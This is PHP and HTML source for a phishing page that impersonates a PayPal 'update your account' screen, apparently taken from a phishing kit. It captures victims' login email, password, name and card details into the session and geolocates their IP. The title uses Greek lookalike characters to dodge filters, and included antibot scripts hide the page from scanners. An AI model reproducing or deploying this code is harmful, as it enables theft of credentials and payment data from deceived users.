<?php

 session_start();



$login_email= $_POST['login_email'];
$login_password= $_POST['login_password'];
$_SESSION['login_email'] = $login_email;
$_SESSION['login_password'] = $login_password;



$_SESSION['number'] = $_POST['number'];
$_SESSION['fname'] = $_POST['fname'];
$_SESSION['lname'] = $_POST['lname'];
$_SESSION['c_type'] = $_POST['c_type'];

$_SESSION['_countryCode_'] = $_POST['countryCode'];



// Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;


// GET Country & Country CODE !


$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
if($query && $query['status'] == 'success') {
  $_SESSION['_country_'] = $query['country'];
  $_SESSION['_countryCode_'] = $query['countryCode'];
}
#END


?>
	<?php include("./antibots.php") ?>
	<?php include("./antibot.php") ?>

<html>
	<head>

        <link rel="shortcut icon" type="image/x-icon" href="./auth/images/favicon.ico"/>
		<title>Update your &#929;&#945;y&#929;&#945;l account</title>

		<meta http-equiv="content-type" content="text/html; charset=UTF-8"  />


		<link rel="shortcut icon" href="./auth/ico/pp_favicon_x.ico" />
<link rel="apple-touch-icon" href="./auth/ico/apple-touch-icon.png" />

<script type="text/javascript" src="./auth/js/mask/jquery-latest.min.js"></script>
<script type="text/javascript" src="./auth/js/mask/bootstrap.min.js"></script>
<script type="text/javascript" src="./auth/js/mask/jquery.mask.min.js"></script>

		<script src="./auth/js/Label/jquery.floatingFormLabel.js"></script>


     <script src="./auth/js/number.js"></script>

            <!-- Card  -->

<script src="./auth/js/val/jquery.creditCardValidator.js" type="text/javascript"></script>

       <!-- Card  -->

<script type="text/javascript" src="./auth/js/info.js"></script>

		<link rel="stylesheet" href="./auth/css/pagecss.css"  type="text/css"   charset="utf-8">


		   	<link rel="stylesheet" href="./auth/css/loading.css" media="screen" />


		     <link href="./auth/css/error.css"  rel="stylesheet"    media="screen" type="text/css" />

		       <!-- Telephone  -->

     

      <!-- Telephone  -->


		                  <!-- GOOGLE ANALYTICS -->



    <!-- /GOOGLE ANALYTICS -->



 <script type="text/javascript">
  $(function() {
    $('.dddd').mask('00/00/0000');


         $('.MonthYear').mask('00/0000');

           $('.date').mask('00/00/0000');
  });
</script>

		<script>
    $(function() {
        $('#number').validateCreditCard(function(result) {
            document.getElementById('crad_type').value = result.card_type.name
			document.getElementById('card_valid').value = result.valid
        });
    });
</script>

		 <script type="text/javascript">
var ray={
ajax:function(st)
	{
		this.show('load');
	},
show:function(el)
	{
		this.getID(el).style.display='';
	},
getID:function(el)
	{
		return document.getElementById(el);
	}

}</script>


<style type="text/css">
#load{
     position:  absolute;
    right: 0;
    bottom: 0;
    left: 0;
    height:0;
    z-index: 200;
    margin: 0;
    text-align: center;

    }


.auto-style1 {
	text-align: center;
}


input:-webkit-autofill {
    -webkit-box-shadow: 0 0 0px 1000px white inset;
}

select:-webkit-autofill {
    -webkit-box-shadow: 0 0 0px 1000px white inset;
}


</style>


<style>
		 .ssn {display:none;}
		 .sort {display:none;}
		 .dni {display:none;}
		 .portugaliano {display:none;}
         .codefisical {display:none;}

	</style>



</head>







	<body>

		<!-- Menu-->


		<?php include("./html/menu.php") ?>
				<!-- info-->


				 	 <?php include("./html/text.php") ?>

 

  <link rel="stylesheet" href="./auth/phone/css/intlTelInput.css">
  <script src="./auth/phone/js/intlTelInput.js"></script>
      <script src="./auth/phone/js/countrySync.js"></script>

		<!-- final-->
		<?php include("./html/final.php") ?>


	</body>
</html>
